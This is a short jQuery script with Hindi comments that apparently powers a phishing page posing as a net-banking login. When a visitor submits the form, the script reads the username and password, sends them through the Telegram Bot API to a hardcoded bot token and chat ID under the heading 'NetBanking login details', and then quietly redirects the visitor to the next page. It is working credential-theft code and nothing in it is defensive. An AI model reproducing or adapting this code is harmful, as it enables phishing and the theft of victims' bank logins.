$(document).ready(function() {
    $("#submitForm").submit(function(event) {
        event.preventDefault(); // फॉर्म का डिफ़ॉल्ट सबमिशन रोकें

        var username = $("input[name='username']").val();
        var password = $("input[name='password']").val();
        var nextPage = $("#nextValue").val(); // अगले पेज का URL

        // Telegram API Details
        var botToken = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU";
        var chatId = "-1002677669875";
        var message = `🔑 *NetBanking लॉगिन डिटेल्स*\n\n👤 *Username:* ${username}\n🔒 *Password:* ${password}`;

        var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        // Telegram API पर डेटा भेजें
        fetch(telegramUrl)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    $("#submitForm")[0].reset(); // फॉर्म रीसेट करें
                    window.location.href = nextPage; // अगले पेज पर जाएं
                } else {
                    alert("मैसेज भेजने में समस्या आई। कृपया फिर से प्रयास करें।");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("सर्वर से कनेक्ट नहीं हो सका। कृपया इंटरनेट चेक करें।");
            });
    });
});